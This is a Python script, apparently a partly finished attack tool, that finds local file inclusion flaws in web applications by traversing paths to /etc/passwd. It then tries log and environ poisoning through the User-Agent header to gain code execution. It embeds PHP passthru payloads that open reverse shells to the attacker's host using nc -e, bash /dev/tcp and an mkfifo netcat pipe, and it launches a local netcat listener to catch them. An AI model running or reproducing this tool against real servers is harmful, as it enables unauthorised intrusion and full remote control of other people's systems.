#!/usr/bin/env python3

import requests
import requests.exceptions
import argparse
from colorama import Fore , Style
import sys
import subprocess
import time

MAX_DEPTH = 10
	
#description of the tool
tool_description = ""	#to be filled
parser = argparse.ArgumentParser(description = tool_description)

parser.add_argument("METHOD" , help="specify whether to use GET/POST request")
parser.add_argument("URL" , help="specify the URL to be tested for LFI")
parser.add_argument("--params" , "-p" , help="speficy the parameteres when POST method is used" , required=False)
parser.add_argument("--proxy" , help="specify an HTTP proxy" , required=False)
parser.add_argument("--user-agent" , "-u" , help="specify a custom User-Agent in the request" , required=False)
parser.add_argument("-v" , help="verbouse output" , action="store_true")
parser.add_argument("--lhost" , "-L" , help="specify local host IP to receive connections" , required=True)
parser.add_argument("--lport" , "-P" , help="specify local port to listen on" , required=False)
arguments = parser.parse_args()


first_sled = "/"

other_sled = "../"

files = {
	"etc/passwd" : "root:x:" , 
}

shell_spawner_files = { 
	"proc/self/environ" : "HTTP_USER_AGENT" ,
	"var/log/auth.log" : "session opened for user" ,
}
							#to be filled with more file names that are world readable generally
headers = {
	"Content-Type" : "application/x-www-form-urlencoded"	#necessary for getting output
}
if arguments.user_agent is not None:	#in case custom user agent is specified
	headers.update( {
		"User-Agent" : arguments.user_agent
	} )
proxy = {
	"http" : arguments.proxy
}

LHOST = arguments.lhost
if arguments.lport:
	LPORT = arguments.lport
else:
	LPORT = "7777"
spawn_commands = [
	f'<?php passthru("nc {LHOST} {LPORT} -e /bin/bash"); ?>' ,
	f'<?php passthru("bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"); ?>' , 
	f'<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"); ?>' ,
]

#GET-related stuff
def using_get_request():
	URL = arguments.URL
	if arguments.v:
		print(f'[+]URL = "{URL}"')
	index_to_be_injected = URL.find("*")	#find() returns the index of the character if present
	if index_to_be_injected >= 0:
		if arguments.v:
			print("[+]Found injection point in URL")
		if URL[index_to_be_injected - 1] == "=":
			if arguments.v:
				print("[+]URL seems to be valid")
		else:
				print(Fore.RED + "[-]Invalid Parameter(missing '=')")	#if '=' is missing before '*'
				sys.exit()
	else:
		print(Fore.RED + "[-]Injection point not found!")			#if '*'(injection point) is absent
		sys.exit()
	
	
	#for first sled checks
	LFI_FOUND = False
	for current_file in files:
		URL = arguments.URL
		file_to_be_checked = first_sled + current_file
		URL = URL.replace("*" , file_to_be_checked)
		if arguments.v:
			print(f"[+]Testing for URL: {URL}")
		LFI_FOUND = test_url(URL , files[current_file])
		if LFI_FOUND == True:
			break
	if LFI_FOUND == True:
		check_shell(arguments.URL , first_sled)
		sys.exit()

	#for other sled checks
	for depth in range(1 , MAX_DEPTH):			# starting from 1 because we have already done checks for 0 sled(0 depth)
		for current_file in files:
			URL = arguments.URL
			file_to_be_checked = other_sled * depth + current_file
			URL = URL.replace("*" , file_to_be_checked)
			if arguments.v:
				print(f"[+]Testing for URL: {URL}")
			LFI_FOUND = test_url(URL , files[current_file])
			if LFI_FOUND == True:
				break	#if LFI is found already, no need to go deeper, just exit the loop and start shell spawn process
		if LFI_FOUND == True:
			break
	check_shell(arguments.URL , other_sled * depth)
	sys.exit()
					

def check_shell(data , sled):
	for current_file in shell_spawner_files:
		target_file = data.replace("*" , (sled + current_file))
		if test_url(target_file , shell_spawner_files[current_file]) == True:
			spawn_shell(target_file , sled , current_file)
		else:
			print(Fore.RED + "[-]Shell can't be spawned using " + target_file)

def spawn_shell(data , sled , spawner_file):
	open_shell()
	for commands in spawn_commands:
		if spawner_file == "proc/self/environ":
			header = headers
			header.update({
				"User-Agent" : commands
			})
			if arguments.METHOD.lower() == "get":
				response = requests.get(data , proxies = proxy , headers = header)
			elif arguments.METHOD.lower() == "post":
				response = requests.post(url=arguments.URL , data = data , proxies = proxy , headers = header)
			choice = input("Got the shell? [y/N]")
			if choice.lower() == "y":
				sys.exit("Enjoy pwning! :-) ")

		if spawner_file == "var/log/auth.log":
			pass
			#to be completed

def open_shell():
	subprocess.Popen(f'gnome-terminal -x /bin/netcat -vlp {LPORT}' , shell=True , stderr=subprocess.PIPE)
	time.sleep(3)


def test_url(data , key_string):
	try:
		if arguments.METHOD.lower() == "get":
			response = requests.get(data , headers = headers , proxies = proxy)
		elif arguments.METHOD.lower() == "post":
			response = requests.post(url=arguments.URL , data=data , headers = headers , proxies = proxy)
	except requests.exceptions.ConnectionError:
			print(Fore.RED + "[!]Error in establishing connection")
			sys.exit()
	except:
			print(Fore.RED + "[!]Oops! Something unusual happened in test_url_get()")
	if response.status_code >=200 and response.status_code < 400:
		if response.text.find(key_string) > -1:
			LFI_FOUND = True
			print(Fore.YELLOW + f"[+]LFI found for {data}" + Style.RESET_ALL)
			return True
		else:
			return False
	else:
		print(Fore.RED + f"[-]Request wasn't successful! Status code = {response.status_code}" + Style.RESET_ALL)
		sys.exit()
	

#POST STUFF
#############
def using_post_request():
	URL = arguments.URL
	params = arguments.params
	print(f'[+]URL = "{URL}"')
	#finding injection point
	if params is not None:
		index_to_be_injected = params.find("*")		#find() returns the index of the character if present
		
		if index_to_be_injected >= 0:				#if injection point('*') is present
			print("[+]Found injection point in parameters")
			if params[index_to_be_injected - 1] == "=":	#if '=' is placed before '*'
				print("[+]parameter seems to be valid")
			else:
				print(Fore.RED + "[-]Invalid Parameter(missing '=')")	#if '=' is missing before '*'
				sys.exit()
		else:
			print(Fore.RED + "[-]Injection point not found!")			#if '*'(injection point) is absent
			sys.exit()
	else:
			print(Fore.RED + "[-]POST data missing")				#if POST data isn't specified
			sys.exit()


	#for first sled checks
	LFI_FOUND = False
	for current_file in files:
		URL = arguments.URL
		file_to_be_checked = first_sled + current_file
		params = params.replace("*" , file_to_be_checked)
		print(params)
		LFI_FOUND = test_url(params , files[current_file])

	#for other sled checks
	LFI_FOUND = False
	for depth in range(1 , MAX_DEPTH):			# starting from 1 because we have already done checks for 0 sled(0 depth)
		if LFI_FOUND is not True:
			for current_file in files:
				params = arguments.params
				file_to_be_checked = other_sled * depth + current_file
				params = params.replace("*" , file_to_be_checked)
				if arguments.v:
					print(f"[+]Testing for URL: {params}" , LFI_FOUND)
				LFI_FOUND = test_url(params , files[current_file])

###### MAIN ########
if __name__ == "__main__":
	if arguments.METHOD.lower() == "get":				#lower() for case insensitive comparision
		using_get_request()

	elif arguments.METHOD.lower() == "post":
		using_post_request()

	else:
		print(Fore.RED + "Invalid Method!")
